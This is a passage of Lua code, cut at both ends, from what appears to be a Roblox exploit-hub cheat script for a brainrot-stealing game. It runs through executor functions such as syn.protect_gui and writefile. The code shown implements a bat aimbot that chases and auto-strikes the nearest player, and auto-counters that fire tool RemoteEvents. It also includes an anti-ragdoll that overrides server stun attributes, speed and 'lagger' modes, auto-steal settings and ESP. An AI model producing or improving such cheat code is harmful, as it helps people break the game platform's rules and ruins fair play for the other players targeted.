    local function apply(folder,child,key)
        local f=animate:FindFirstChild(folder)
        local a=f and f:FindFirstChild(child)
        if a and _animOriginalIds[key] then a.AnimationId=_animOriginalIds[key] end
    end
    apply("walk","WalkAnim","walk"); apply("run","RunAnim","run")
    apply("jump","JumpAnim","jump"); apply("fall","FallAnim","fall")
    apply("climb","ClimbAnim","climb")
    apply("idle","Animation1","idle1"); apply("idle","Animation2","idle2")
    pcall(function() animate.Disabled=true; task.wait(); animate.Disabled=false end)
end
function applyAnimPack(packName)
    animPackName=packName or "OFF"
    local char=LP.Character
    if not char then return false end
    if not animPackEnabled or packName=="OFF" or not ANIM_PACKS[packName] then
        resetAnimPack(char)
        return false
    end
    local pack=ANIM_PACKS[packName]
    saveOriginalAnims(char)
    local animate=char:FindFirstChild("Animate")
    if not animate then return false end
    local hum=char:FindFirstChildOfClass("Humanoid")
    stopAnimTracks(hum)
    local function ensure(folderName,animName)
        local folder=animate:FindFirstChild(folderName)
        if not folder then return nil end
        local a=folder:FindFirstChild(animName)
        if not a then
            a=Instance.new("Animation"); a.Name=animName; a.Parent=folder
        end
        return a
    end
    setAnimId(ensure("walk","WalkAnim"),pack.WalkAnim)
    setAnimId(ensure("run","RunAnim"),pack.RunAnim)
    setAnimId(ensure("jump","JumpAnim"),pack.JumpAnim)
    setAnimId(ensure("fall","FallAnim"),pack.FallAnim)
    setAnimId(ensure("climb","ClimbAnim"),pack.ClimbAnim)
    setAnimId(ensure("idle","Animation1"),pack.Animation1)
    setAnimId(ensure("idle","Animation2"),pack.Animation2)
    pcall(function() animate.Disabled=true; task.wait(); animate.Disabled=false end)
    return true
end

function findMedusa()
    local c=LP.Character; if not c then return nil end
    for _,t in ipairs(c:GetChildren()) do
        if t:IsA("Tool") then local n=t.Name:lower(); if n:find("medusa") or n:find("head") or n:find("stone") then return t end end
    end
    local bp=LP:FindFirstChild("Backpack")
    if bp then for _,t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower(); if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end end
    return nil
end
function useMedusaCounter()
    if medusaDebounce then return end
    if MEDUSA_COOLDOWN>(tick()-medusaLastUsed) then return end
    local c=LP.Character; if not c then return end
    medusaDebounce=true
    local med=findMedusa()
    if not med then medusaDebounce=false; return end
    local hum2=c:FindFirstChildOfClass("Humanoid")
    if med.Parent~=c and hum2 then
        pcall(function() hum2:EquipTool(med) end)
    end
    -- fire immediately (no wait)
    pcall(function() med:Activate() end)
    pcall(function()
        local rem=med:FindFirstChildWhichIsA("RemoteEvent",true)
        if rem then rem:FireServer() end
    end)
    medusaLastUsed=tick()
    task.defer(function() medusaDebounce=false end)
end
function onAnchorChanged(part)
    return part:GetPropertyChangedSignal("Anchored"):Connect(function()
        if part.Anchored and (part.Transparency>=0.9 or part.LocalTransparencyModifier>=0.9) then
            if medusaCounterEnabled then useMedusaCounter() end
        end
    end)
end
setupMedusa=function(char)
    for _,c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end; Conns.anchor={}
    if not char then return end
    for _,part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then table.insert(Conns.anchor,onAnchorChanged(part)) end
    end
    table.insert(Conns.anchor,char.DescendantAdded:Connect(function(part)
        if part:IsA("BasePart") then table.insert(Conns.anchor,onAnchorChanged(part)) end
    end))
    -- fast Heartbeat scan (catches TP/stone without relying only on property signal)
    table.insert(Conns.anchor, RunService.Heartbeat:Connect(function()
        if not medusaCounterEnabled or medusaDebounce then return end
        if not char or not char.Parent then return end
        for _,part in ipairs(char:GetChildren()) do
            if part:IsA("BasePart") and part.Anchored and (part.Transparency>=0.9 or part.Name=="HumanoidRootPart") then
                -- stone/ragdoll style lock often anchors HRP or makes parts invisible
                if part.Transparency>=0.9 then
                    useMedusaCounter()
                    return
                end
            end
        end
    end))
end
stopMedusaCounter=function()
    for _,c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end; Conns.anchor={}
end

-- ============================================================
-- SAFE MODE (from SenpaiHub) — locks combat paths while carrying / duel countdown
-- ============================================================
local SafeMode = {
    blockedTools = {
        bat=true, slap=true, sword=true, gun=true, pistol=true, rifle=true,
        medusa=true, hammer=true, axe=true, knife=true, katana=true, blade=true, fist=true,
    },
    monitorStarted = false,
}

function SafeMode.getCountdownLabel()
    local ok, label = pcall(function()
        return LP.PlayerGui
            and LP.PlayerGui:FindFirstChild("DuelsMachineTopFrame")
            and LP.PlayerGui.DuelsMachineTopFrame:FindFirstChild("DuelsMachineTopFrame")
            and LP.PlayerGui.DuelsMachineTopFrame.DuelsMachineTopFrame:FindFirstChild("Timer")
            and LP.PlayerGui.DuelsMachineTopFrame.DuelsMachineTopFrame.Timer:FindFirstChild("Label")
    end)
    return (ok and label) or nil
end

function SafeMode.countdownNumber(text)
    local t = tostring(text or ""):upper():gsub("^%s+", ""):gsub("%s+$", "")
    if t == "GO" or t == "START" or t == "READY" then return true end
    local n = tonumber(t)
    return n ~= nil and n >= 0 and n <= 10
end

function SafeMode.inDuelCountdown()
    local label = SafeMode.getCountdownLabel()
    return label and SafeMode.countdownNumber(label.Text) or false
end

function SafeMode.isCarryableTool(tool)
    if not tool or not tool:IsA("Tool") then return false end
    local name = tool.Name:lower()
    for word in pairs(SafeMode.blockedTools) do
        if name:find(word, 1, true) then return false end
    end
    return true
end

function SafeMode.holdingBrainrot()
    local ok, val = pcall(function() return LP:GetAttribute("Stealing") end)
    if ok and val == true then return true end
    local ok2, val2 = pcall(function() return LP:GetAttribute("AntiKick") end)
    if ok2 and val2 == true then return true end
    local char = LP.Character
    if not char then return false end
    local ok3, val3 = pcall(function() return char:GetAttribute("Stealing") end)
    if ok3 and val3 == true then return true end
    for _, name in ipairs({"Carrying", "IsCarrying", "Grabbed", "Holding", "StealHold", "HasGrab"}) do
        local v = char:FindFirstChild(name, true)
        if v then
            if v:IsA("BoolValue") and v.Value then return true end
            if v:IsA("ObjectValue") and v.Value then return true end
            if v:IsA("StringValue") and v.Value ~= "" then return true end
        end
    end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Tool") then
            local n = child.Name:lower()
            if n:find("brainrot") or n:find("skibidi") or n:find("toilet") then
                return true
            end
            -- non-weapon tools often = carried animal
            if SafeMode.isCarryableTool(child) and (n:find("animal") or n:find("pet") or n:find("rot") or #n > 2) then
                -- only treat as carry if not a known combat tool (already filtered)
                if not (n:find("bat") or n:find("slap") or n:find("medusa")) then
                    -- soft check: many brainrot tools are unique names
                end
            end
        end
        if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
            local n = child.Name:lower()
            if n:find("brainrot") or n:find("animal") or n:find("carry") or n:find("grab") or n:find("steal") or n:find("hold") then
                return true
            end
        end
    end
    -- backpack-equipped brainrot style tools on character only (already checked tools above)
    return false
end

function SafeMode.isLocked()
    if not RXZ.antiKick then return false end
    return SafeMode.inDuelCountdown() or SafeMode.holdingBrainrot()
end

function SafeMode.forceStop(reason)
    local stopped = false
    if autoBatEnabled then
        autoBatEnabled = false
        if resetAutoBatMotion then resetAutoBatMotion() end
        if stopBatAimbot then stopBatAimbot() end
        if autoBatSetVisual then autoBatSetVisual(false) end
        if mobBtnRefs and mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
        stopped = true
    end
    if autoLeftEnabled then
        autoLeftEnabled = false
        if stopAutoLeft then stopAutoLeft() end
        if autoLeftSetVisual then autoLeftSetVisual(false) end
        if mobBtnRefs and mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end
        stopped = true
    end
    if autoRightEnabled then
        autoRightEnabled = false
        if stopAutoRight then stopAutoRight() end
        if autoRightSetVisual then autoRightSetVisual(false) end
        if mobBtnRefs and mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end
        stopped = true
    end
    if RXZ.tpBat then
        if RXZ.stopTPBat then RXZ.stopTPBat() end
        if RXZ.setTPBatVisual then RXZ.setTPBatVisual(false) end
        if mobBtnRefs and mobBtnRefs.tpBat then mobBtnRefs.tpBat(false) end
        stopped = true
    end
    RXZ.brainrot = SafeMode.holdingBrainrot()
    return stopped
end

function SafeMode.tryStart()
    if SafeMode.isLocked() then
        SafeMode.forceStop("SAFE MODE")
        return false
    end
    return true
end

function RXZ.enableAntiKick()
    RXZ.antiKick = true
    if not SafeMode.monitorStarted then
        SafeMode.monitorStarted = true
        RunService.Heartbeat:Connect(function()
            if RXZ.antiKick and SafeMode.isLocked() then
                SafeMode.forceStop("SAFE MODE")
            end
            -- keep legacy brainrot flag in sync for any old checks
            RXZ.brainrot = RXZ.antiKick and SafeMode.holdingBrainrot()
        end)
    end
    -- immediate lock check
    if SafeMode.isLocked() then
        SafeMode.forceStop("SAFE MODE")
    end
end

function RXZ.disableAntiKick()
    -- Safe Mode is permanent: cannot be turned off
    RXZ.antiKick = true
end

local BAT_COUNTER_SLAP_LIST={"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
function findBatForCounter()
    local c=LP.Character; if not c then return nil end; local bp=LP:FindFirstChildOfClass("Backpack")
    for _,name in ipairs(BAT_COUNTER_SLAP_LIST) do local t=c:FindFirstChild(name) or (bp and bp:FindFirstChild(name)); if t then return t end end
    for _,ch in ipairs(c:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end
    if bp then for _,ch in ipairs(bp:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end end
    return nil
end
function swingBatForCounter(bat,char)
    local hum2=char:FindFirstChildOfClass("Humanoid")
    if bat.Parent~=char then if hum2 then pcall(function() hum2:EquipTool(bat) end) end; task.wait(0.05) end
    local remote=bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
    if remote and remote:IsA("RemoteEvent") then
        pcall(function() remote:FireServer() end); task.wait(0.15); pcall(function() remote:FireServer() end)
    else
        pcall(function() bat:Activate() end); task.wait(0.15); pcall(function() bat:Activate() end)
    end
end
startBatCounter=function()
    if Conns.batCounter then return end
    Conns.batCounter=RunService.Heartbeat:Connect(function()
        if not batCounterEnabled or batCounterDebounce then return end
        local char=LP.Character; if not char then return end
        local hum2=char:FindFirstChildOfClass("Humanoid"); if not hum2 then return end
        local st=hum2:GetState()
        if st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then
            batCounterDebounce=true
            task.spawn(function()
                local bat=findBatForCounter(); if bat then swingBatForCounter(bat,char) end
                task.wait(0.5); batCounterDebounce=false
            end)
        end
    end)
end
stopBatCounter=function()
    if Conns.batCounter then Conns.batCounter:Disconnect(); Conns.batCounter=nil end; batCounterDebounce=false
end

-- BAT AIMBOT (old VOID system)
local aimbotConn=nil
local _predBall=nil
function getClosestTarget()
    local root=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart"); if not root then return nil end
    local closest,minDist=nil,math.huge
    for _,plr in ipairs(Players:GetPlayers()) do
        if plr~=LP and plr.Character then
            local tRoot=plr.Character:FindFirstChild("HumanoidRootPart"); local hum=plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health>0 then
                local dist=(tRoot.Position-root.Position).Magnitude
                if dist<minDist then minDist=dist; closest=tRoot end
            end
        end
    end
    return closest
end
function swingCurrentBat()
    if not autoSwingEnabled then return end
    local bat=findBat()
    if bat and bat.Parent==LP.Character and bat:IsA("Tool") then
        pcall(function() bat:Activate() end)
    end
end
startBatAimbot=function()
    -- clear TP bat / anti desync so aimbot can run
    RXZ.tpBat=false
    if RXZ.tpConn then pcall(function() RXZ.tpConn:Disconnect() end); RXZ.tpConn=nil end
    if RXZ.setTPBatVisual then pcall(function() RXZ.setTPBatVisual(false) end) end
    if mobBtnRefs and mobBtnRefs.tpBat then pcall(function() mobBtnRefs.tpBat(false) end) end
    if aimbotConn then aimbotConn:Disconnect() end
    autoBatEnabled=true
    if autoLeftEnabled then autoLeftEnabled=false; if autoLeftSetVisual then autoLeftSetVisual(false) end; stopAutoLeft() end
    if autoRightEnabled then autoRightEnabled=false; if autoRightSetVisual then autoRightSetVisual(false) end; stopAutoRight() end
    local hum0=LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum0 then hum0.AutoRotate=false end
    aimbotConn=RunService.RenderStepped:Connect(function()
        if not autoBatEnabled then return end
        local c=LP.Character; if not c then return end
        local root=c:FindFirstChild("HumanoidRootPart"); if not root then return end
        local hum=c:FindFirstChildOfClass("Humanoid"); if not hum then return end
        if not c:FindFirstChildOfClass("Tool") then
            local bat=findBat(); if bat then pcall(function() hum:EquipTool(bat) end) end
        end
        local target=getClosestTarget()
        if not target then swingCurrentBat(); return end
        local targetVel=target.AssemblyLinearVelocity
        local myPos=root.Position
        local targetPos=target.Position
        local predictPos=targetPos+targetVel*0.14+target.CFrame.LookVector*0.3
        local direction=predictPos-myPos
        local flatDir=Vector3.new(direction.X,0,direction.Z)
        if flatDir.Magnitude < 0.05 then
            flatDir = root.CFrame.LookVector
        else
            flatDir = flatDir.Unit
        end
        local chaseSpeed=58
        local desiredHeight=targetPos.Y+3.7
        local yVel=(desiredHeight-myPos.Y)*19.5+targetVel.Y*0.8
        if hum.FloorMaterial~=Enum.Material.Air then yVel=math.max(yVel,13) end
        yVel=math.clamp(yVel,-70,110)
        local desiredVel=Vector3.new(flatDir.X*chaseSpeed,yVel,flatDir.Z*chaseSpeed)
        root.AssemblyLinearVelocity=root.AssemblyLinearVelocity:Lerp(desiredVel,0.8)
        local speed3=targetVel.Magnitude
        local predictTime=math.clamp(speed3/150,0.05,0.2)
        local predictedPos=targetPos+targetVel*predictTime
        local toPredict=predictedPos-myPos
        if toPredict.Magnitude>0.1 then
            local goalCF=CFrame.lookAt(myPos,predictedPos)
            local curCF=root.CFrame
            local diffCF=curCF:Inverse()*goalCF
            local rx,ry,rz=diffCF:ToEulerAnglesXYZ()
            rx=math.clamp(rx,-2.5,2.5); ry=math.clamp(ry,-2.5,2.5); rz=math.clamp(rz,-2.5,2.5)
            local tiltSpeed=42
            root.AssemblyAngularVelocity=root.CFrame:VectorToWorldSpace(Vector3.new(rx*tiltSpeed,ry*tiltSpeed,rz*tiltSpeed))
        end
        swingCurrentBat()
    end)
    if autoBatSetVisual then autoBatSetVisual(true) end
    if mobBtnRefs and mobBtnRefs.autoBat then mobBtnRefs.autoBat(true) end
end
stopBatAimbot=function()
    if aimbotConn then aimbotConn:Disconnect(); aimbotConn=nil end; autoBatEnabled=false
    if _predBall then _predBall:Destroy(); _predBall=nil end
    local char=LP.Character; local root=char and char:FindFirstChild("HumanoidRootPart")
    if root then root.AssemblyLinearVelocity=Vector3.zero; root.AssemblyAngularVelocity=Vector3.zero end
    local hum2=char and char:FindFirstChildOfClass("Humanoid"); if hum2 then hum2.AutoRotate=true end
    if autoTPEnabled then startAutoTP() end
    if autoBatSetVisual then autoBatSetVisual(false) end
    if mobBtnRefs and mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
end
queueAutoBatStart=function()
    -- clear stuck TP bat so aimbot can start
    if RXZ.tpBat and not RXZ.tpConn then
        RXZ.tpBat=false
    end
    if RXZ.tpBat then
        if RXZ.stopTPBat then RXZ.stopTPBat() end
        if RXZ.setTPBatVisual then RXZ.setTPBatVisual(false) end
        if mobBtnRefs and mobBtnRefs.tpBat then mobBtnRefs.tpBat(false) end
    end
    if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then return end
    if RXZ.antiKick and RXZ.brainrot then return end
    if autoLeftEnabled then autoLeftEnabled=false; if autoLeftSetVisual then autoLeftSetVisual(false) end; stopAutoLeft() end
    if autoRightEnabled then autoRightEnabled=false; if autoRightSetVisual then autoRightSetVisual(false) end; stopAutoRight() end
    startBatAimbot()
end
resetAutoBatMotion=function()
    local char=LP.Character; local hrp=char and char:FindFirstChild("HumanoidRootPart"); local hum=char and char:FindFirstChildOfClass("Humanoid")
    if hrp then hrp.AssemblyLinearVelocity=hrp.AssemblyLinearVelocity*0.3; hrp.AssemblyAngularVelocity=Vector3.zero end
    if hum then hum.AutoRotate=true end
end

saveConfig=function()
    local function ks(e)
        if e.kb then return {kb=e.kb.Name,gp=e.gp and e.gp.Name}
        elseif e.gp then return {gp=e.gp.Name}
        else return {kb=nil,gp=nil} end
    end
    local cfg={
        normalSpeed=NS,carrySpeed=CS,dropBrainrotKey=ks(KB.DropBrainrot),autoLeftKey=ks(KB.AutoLeft),
        autoRightKey=ks(KB.AutoRight),autoBatKey=ks(KB.AutoBat),laggerToggleKey=ks(KB.LaggerToggle),laggerCarryKey=ks(KB.LaggerCarry),tpBatKey=ks(KB.TPBat),
        tpFloorKey=ks(KB.TPFloor),guiHideKey=ks(KB.GuiHide),speedToggleKey=ks(KB.SpeedToggle),batV2Key=ks(KB.BatV2),
        grabRadius=Steal.StealRadius,stealDuration=Steal.StealDuration,antiRagdoll=antiRagdollEnabled,
        batV2Speed=batV2Speed,batV2Enabled=batV2Enabled,mirrorTPDownEnabled=mirrorTPDownEnabled,voidThemeName=voidThemeName,autoStealEnabled=Steal.AutoStealEnabled,stealMode=Steal.Mode,stealBarStyle=stealBarStyle,stealBarScale=stealBarScale,infiniteJump=infJumpEnabled,infJumpMode=infJumpMode,
        medusaCounter=medusaCounterEnabled,batCounter=batCounterEnabled,carrySpeedActive=carrySpeedActive,antiDieEnabled=antiDieEnabled,
        laggerModeEnabled=laggerModeEnabled,laggerSpeed=LAGGER_SPEED,laggerCarrySpeed=LAGGER_CARRY_SPEED,
        autoBat=autoBatEnabled,aimbotAfterHit=aimbotAfterHitEnabled,autoSwing=autoSwingEnabled,unwalkEnabled=unwalkEnabled,antiLag=antiLagEnabled,
        stretchRez=stretchRezEnabled,autoTPEnabled=autoTPEnabled,autoTPHeight=autoTPHeight,
        guiTransparencyEnabled=guiTransparencyEnabled,mobileButtonsEnabled=mobileButtonsEnabled,discordLinkEnabled=discordLinkEnabled,logoCircleEnabled=logoCircleEnabled,
        mobileButtonsLocked=mobileButtonsLocked,mobileButtonsSize=mobileButtonsSize,
        circleButtonsEnabled=circleButtonsEnabled,autoSwitchSpeed=autoSwitchSpeedEnabled,uiLocked=uiLocked,
        headlessEnabled=headlessEnabled,korbloxEnabled=korbloxEnabled,
        animPackEnabled=animPackEnabled,animPackName=animPackName,
        fovValue=fovValue,perButtonDrag=perButtonDragEnabled,skyTheme=currentSkyTheme,
        antiKick=RXZ.antiKick,autoMoveSwing=autoMoveSwingEnabled,
        autoMoveSwingInterval=autoMoveSwingInterval,ragdollGui=ragdollGuiEnabled,
        espEnabled=espEnabled,
        espAvatarsEnabled=espAvatarsEnabled,
        backgroundEnabled=backgroundEnabled,backgroundIndex=backgroundIndex,
        keys=(function()
            if not _GuiKeys then return {} end
            local t={}; for k,v in pairs(_GuiKeys) do if v and v.Name then t[k]=v.Name end end; return t
        end)(),
        keybinds=(function()
            local t={}
            for name,entry in pairs(KB) do
                if type(entry)=="table" then
                    t[name]={
                        kb = entry.kb and entry.kb.Name or nil,
                        gp = entry.gp and entry.gp.Name or nil,
                    }
                end
            end
            return t
        end)()
    }
    if writefile then pcall(function() writefile("RXZ_HUB.json",HS:JSONEncode(cfg)) end) end
end
task.spawn(function() while task.wait(5) do saveConfig() end end)

function resetAllSettings()
    NS=59; CS=9; LAGGER_SPEED=30; LAGGER_CARRY_SPEED=15; carrySpeedActive=false; laggerModeEnabled=false; antiDieEnabled=true
    autoSwitchSpeedEnabled=false; antiRagdollEnabled=false; infJumpEnabled=false; infJumpMode="manual"
    medusaCounterEnabled=false; batCounterEnabled=false; unwalkEnabled=false
    RXZ.antiKick=true; if RXZ.enableAntiKick then RXZ.enableAntiKick() end
    autoLeftEnabled=false; autoRightEnabled=false; autoBatEnabled=false; autoSwingEnabled=true; autoMoveSwingEnabled=false
    autoTPEnabled=false; autoTPHeight=20; antiLagEnabled=false; stretchRezEnabled=false
    Steal.AutoStealEnabled=false; Steal.StealRadius=60; Steal.StealDuration=1.3
    guiTransparencyEnabled=false; mobileButtonsEnabled=true; mobileButtonsSize=80; discordLinkEnabled=true
    circleButtonsEnabled=false; uiLocked=false; fovValue=80; fovIndex=1
    KB.DropBrainrot={kb=nil,gp=nil}; KB.AutoLeft={kb=nil,gp=nil}; KB.AutoRight={kb=nil,gp=nil}
    KB.AutoBat={kb=nil,gp=nil}; KB.TPFloor={kb=nil,gp=nil}
    KB.GuiHide={kb=nil,gp=nil}; KB.SpeedToggle={kb=nil,gp=nil}; KB.LaggerToggle={kb=nil,gp=nil}
    if refreshSpeedModeLabel then refreshSpeedModeLabel() end
    if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
    if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
    if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end
    if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end
    if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
    stopBatAimbot(); stopAutoSteal(); stopAutoLeft(); stopAutoRight(); stopAntiRagdoll(); stopAutoTP(); stopHoldInfJump()
    if stretchRezEnabled then disableStretchRez() end; if antiLagEnabled then disableAntiLag() end
    saveConfig()
end

local setInfJumpVisual,setAntiRagVisual,setMedusaVisual,setUnwalkVisual,setAntiLagVisual,setAutoSwingVisual
local setTranspVisual,setLockVisual,setMobVisual,setCircleBtnsVisual
local normalBox,carryBox,laggerBox,radInput,autoTPHeightBox,durationBox
local mainFrame=nil
local _persistentConns={}
function trackConn(conn) table.insert(_persistentConns,conn); return conn end
function clearPersistentConns()
    for _,c in ipairs(_persistentConns) do pcall(function() c:Disconnect() end) end; _persistentConns={}
end

refreshSpeedModeLabel=function()
    if modeValLbl then
        if laggerModeEnabled then modeValLbl.Text=carrySpeedActive and "Lagger Carry" or "Lagger Mode"
        elseif carrySpeedActive then modeValLbl.Text="Carry"
        else modeValLbl.Text="Normal" end
    end
    if laggerModePillRef and laggerModePillRef.pill and laggerModePillRef.dot then
        local pill=laggerModePillRef.pill; local dot=laggerModePillRef.dot; local on=laggerModeEnabled
        local WHITE=Color3.fromRGB(255,255,255); local OFF=Color3.fromRGB(46,24,38); local GRAY=Color3.fromRGB(180,150,165)
        TweenService:Create(pill,TweenInfo.new(0.16,Enum.EasingStyle.Quad),{BackgroundColor3=on and WHITE or OFF}):Play()
        TweenService:Create(dot,TweenInfo.new(0.16,Enum.EasingStyle.Back),{Position=on and UDim2.new(1,-13,0.5,-5) or UDim2.new(0,3,0.5,-5),BackgroundColor3=on and Color3.fromRGB(30,30,30) or GRAY}):Play()
    end
    if carryModePillRef and carryModePillRef.pill and carryModePillRef.dot then
        local pill=carryModePillRef.pill; local dot=carryModePillRef.dot; local on=carrySpeedActive
        local WHITE=Color3.fromRGB(255,255,255); local OFF=Color3.fromRGB(46,24,38); local GRAY=Color3.fromRGB(180,150,165)
        TweenService:Create(pill,TweenInfo.new(0.16,Enum.EasingStyle.Quad),{BackgroundColor3=on and WHITE or OFF}):Play()
        TweenService:Create(dot,TweenInfo.new(0.16,Enum.EasingStyle.Back),{Position=on and UDim2.new(1,-13,0.5,-5) or UDim2.new(0,3,0.5,-5),BackgroundColor3=on and Color3.fromRGB(30,30,30) or GRAY}):Play()
    end
end

local _prevCarryBeforeLagger = false
toggleCarryMode=function()
    if laggerModeEnabled then laggerModeEnabled=false end
    carrySpeedActive=not carrySpeedActive
    refreshSpeedModeLabel()
    if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
    if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
    if mobBtnRefs.laggerCarry then mobBtnRefs.laggerCarry(false) end
    if mobBtnRefs.laggerNormal then mobBtnRefs.laggerNormal(false) end
    if GuiToggleSetters and GuiToggleSetters.carryMode then
        pcall(function() GuiToggleSetters.carryMode(carrySpeedActive) end)
    end
end
toggleLaggerMode=function()
    -- Cycle: OFF -> Lagger Normal -> Lagger Carry -> OFF (syncs mobile buttons)
    if not laggerModeEnabled then
        laggerModeEnabled = true
        carrySpeedActive = false
    elseif laggerModeEnabled and not carrySpeedActive then
        laggerModeEnabled = true
        carrySpeedActive = true
    else
        laggerModeEnabled = false
        carrySpeedActive = false
    end
    refreshSpeedModeLabel()
    if mobBtnRefs.laggerCarry then mobBtnRefs.laggerCarry(laggerModeEnabled and carrySpeedActive) end
    if mobBtnRefs.laggerNormal then mobBtnRefs.laggerNormal(laggerModeEnabled and not carrySpeedActive) end
    if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive and not laggerModeEnabled) end
    if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
    if GuiToggleSetters and GuiToggleSetters.laggerCarry then
        pcall(function() GuiToggleSetters.laggerCarry(laggerModeEnabled and carrySpeedActive) end)
    end
end

-- Dedicated Lagger Carry toggle (ON/OFF only for carry lagger)
toggleLaggerCarry=function()
    if laggerModeEnabled and carrySpeedActive then
        -- turn off
        laggerModeEnabled = false
        carrySpeedActive = false
    else
        -- force Lagger Carry on
        laggerModeEnabled = true
        carrySpeedActive = true
    end
    refreshSpeedModeLabel()
    if mobBtnRefs.laggerCarry then mobBtnRefs.laggerCarry(laggerModeEnabled and carrySpeedActive) end
    if mobBtnRefs.laggerNormal then mobBtnRefs.laggerNormal(laggerModeEnabled and not carrySpeedActive) end
    if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive and not laggerModeEnabled) end
    if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
    if GuiToggleSetters and GuiToggleSetters.laggerCarry then
        pcall(function() GuiToggleSetters.laggerCarry(laggerModeEnabled and carrySpeedActive) end)
    end
end
function speedToggleAction() end

startAntiRagdoll=function()
    if Conns.antiRag then return end
    Conns.antiRag=RunService.Heartbeat:Connect(function()
        if not antiRagdollEnabled then return end
        local c=LP.Character; if not c then return end
        local hum=c:FindFirstChildOfClass("Humanoid"); local root=c:FindFirstChild("HumanoidRootPart")
        if not(hum and root) then return end
        local s=hum:GetState()
        local ragdolled=(s==Enum.HumanoidStateType.Physics or s==Enum.HumanoidStateType.Ragdoll or s==Enum.HumanoidStateType.FallingDown)
        local endTime=LP:GetAttribute("RagdollEndTime")
        if endTime and (endTime-workspace:GetServerTimeNow())>0 then ragdolled=true end
        if ragdolled then
            pcall(function() LP:SetAttribute("RagdollEndTime",workspace:GetServerTimeNow()) end)
            for _,d in ipairs(c:GetDescendants()) do
                if d:IsA("BallSocketConstraint") or (d:IsA("Attachment") and d.Name:find("RagdollAttachment")) then d:Destroy() end
            end
            for _,obj in ipairs(c:GetDescendants()) do
                if obj:IsA("Motor6D") and obj.Enabled==false then obj.Enabled=true end
            end
            if hum.Health>0 then hum:ChangeState(Enum.HumanoidStateType.Running) end
            workspace.CurrentCamera.CameraSubject=hum
            root.Anchored=false; root.AssemblyLinearVelocity=Vector3.zero; root.AssemblyAngularVelocity=Vector3.zero
        end
    end)
end
stopAntiRagdoll=function()
    if Conns.antiRag then Conns.antiRag:Disconnect(); Conns.antiRag=nil end
end
startUnwalk=function()
    local c=LP.Character; if not c then return end; local hum=c:FindFirstChildOfClass("Humanoid")
    if hum then for _,t in ipairs(hum:GetPlayingAnimationTracks()) do t:Stop() end end
    local anim=c:FindFirstChild("Animate"); if anim then unwalkSavedAnimate=anim:Clone(); anim:Destroy() end
end
stopUnwalk=function()
    local c=LP.Character; if c and unwalkSavedAnimate then unwalkSavedAnimate:Clone().Parent=c; unwalkSavedAnimate=nil end
end

-- ============================================================
-- STEAL BAR (2 GUI styles)
-- Style 1 = compact horizontal | Style 2 = current full bar
-- ============================================================
function createStealBar()
    for _,n in ipairs({"MoveeStealBar"}) do
        local old=game:GetService("CoreGui"):FindFirstChild(n); if old then old:Destroy() end
        local pgui=LP:FindFirstChild("PlayerGui"); if pgui then local o=pgui:FindFirstChild(n); if o then o:Destroy() end end
    end
    local WHITE=Color3.fromRGB(255,255,255)
    local BARBG=Color3.fromRGB(18,10,15)
    local style = tonumber(stealBarStyle) or 2
    if style ~= 1 and style ~= 2 then style = 2 end

    local stealGui=Instance.new("ScreenGui")
    stealGui.Name="MoveeStealBar"; stealGui.ResetOnSpawn=false; stealGui.IgnoreGuiInset=true; stealGui.DisplayOrder=8
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(stealGui) end end)
    if not pcall(function() stealGui.Parent=game:GetService("CoreGui") end) then stealGui.Parent=LP:WaitForChild("PlayerGui") end

    local fillLine, fillGrad, pctLbl, fpsLbl, pingLbl, warnFrame, warnLbl

    if style == 1 then
        -- ========== STYLE 1: VERTICAL (full-bar look, next to menu) ==========
        local sc = math.clamp(tonumber(stealBarScale) or 1, 0.7, 1.8)
        local SB_W = math.floor(64 * sc + 0.5)
        local SB_H = math.floor(220 * sc + 0.5)
        local AV_SIZE = math.floor(28 * sc + 0.5)
        local WHITE=Color3.fromRGB(255,255,255)
        local BARBG=Color3.fromRGB(18,10,15)

        stealBarFrame=Instance.new("Frame",stealGui)
        stealBarFrame.Size=UDim2.new(0,SB_W,0,SB_H)
        stealBarFrame.Position=UDim2.new(0, 300, 0.5, -SB_H/2)
        stealBarFrame.BackgroundColor3=BARBG
        stealBarFrame.BorderSizePixel=0
        stealBarFrame.ZIndex=20
        stealBarFrame.ClipsDescendants=true
        stealBarFrame.Visible=true
        stealBarFrame.Active=true
        Instance.new("UICorner",stealBarFrame).CornerRadius=UDim.new(0, math.floor(18*sc+0.5))
        local sbStroke=Instance.new("UIStroke",stealBarFrame)
        sbStroke.Color=WHITE
        sbStroke.Thickness=2
